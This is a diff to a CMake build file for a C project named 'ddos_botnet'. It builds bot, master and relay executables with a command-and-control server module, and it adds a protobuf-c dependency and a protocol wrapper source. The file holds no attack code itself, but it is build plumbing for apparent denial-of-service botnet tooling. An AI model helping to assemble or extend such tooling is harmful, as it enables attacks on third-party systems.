@@ -4,7 +4,6 @@ project(ddos_botnet C)
 set(CMAKE_C_STANDARD 11)
 set(CMAKE_C_STANDARD_REQUIRED ON)
 
-# Opsi kompilasi umum dan peringatan (ditambahkan penanganan warning agar tidak menjadi error fatal)
 add_compile_options(-Wall -Wextra -pthread -Wno-error=implicit-function-declaration -Wno-error=incompatible-pointer-types)
 
 include_directories(
@@ -12,15 +11,13 @@ include_directories(
     src/core
 )
 
-# Direktori include global (ditambahkan src/core agar file header protocol terbaca)
-include_directories(
-    ${CMAKE_CURRENT_SOURCE_DIR}/include
-    ${CMAKE_CURRENT_SOURCE_DIR}/src/core
-)
-
-# Temukan dependensi eksternal yang dibutuhkan (OpenSSL & cURL)
+# Temukan dependensi eksternal (OpenSSL, cURL, protobuf-c)
 find_package(OpenSSL REQUIRED)
 find_package(CURL REQUIRED)
+
+find_package(PkgConfig REQUIRED)
+pkg_check_modules(PROTOBUF_C REQUIRED libprotobuf-c)
+include_directories(${PROTOBUF_C_INCLUDE_DIRS})
 
 # Daftar file sumber berdasarkan modul
 set(AI_SOURCES
@@ -41,6 +38,7 @@ set(CORE_SOURCES
     src/core/c2_server.c
     src/core/heartbeat.c
     src/core/protocol.pb-c.c
+    src/core/protocol_wrapper.c
 )
 
 set(ENGINE_SOURCES
@@ -61,7 +59,6 @@ set(UTILS_SOURCES
     src/utils/metrics.c
 )
 
-# Gabungkan seluruh file implementasi modul dengan entry point utama
 set(ALL_SOURCES
     src/main.c
     ${AI_SOURCES}
@@ -72,22 +69,20 @@ set(ALL_SOURCES
     ${UTILS_SOURCES}
 )
 
-# Atur direktori output binary agar langsung mengarah ke folder build/
 set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR}/build)
 
-# Definisi target executable sesuai dengan kebutuhan binary output
-add_executable(ddos-bot ${ALL_SOURCES})
+add_executable(ddos-bot    ${ALL_SOURCES})
 add_executable(ddos-master ${ALL_SOURCES})
-add_executable(ddos-relay ${ALL_SOURCES})
+add_executable(ddos-relay  ${ALL_SOURCES})
 
-# Tautkan pustaka OpenSSL, cURL, math, dan pthread ke semua target binary
 foreach(TARGET_NAME ddos-bot ddos-master ddos-relay)
-    target_link_libraries(${TARGET_NAME} 
-        PRIVATE 
-            OpenSSL::SSL 
-            OpenSSL::Crypto 
-            CURL::libcurl 
-            m 
+    target_link_libraries(${TARGET_NAME}
+        PRIVATE
+            OpenSSL::SSL
+            OpenSSL::Crypto
+            CURL::libcurl
+            ${PROTOBUF_C_LIBRARIES}
+            m
             pthread
     )
 endforeach()
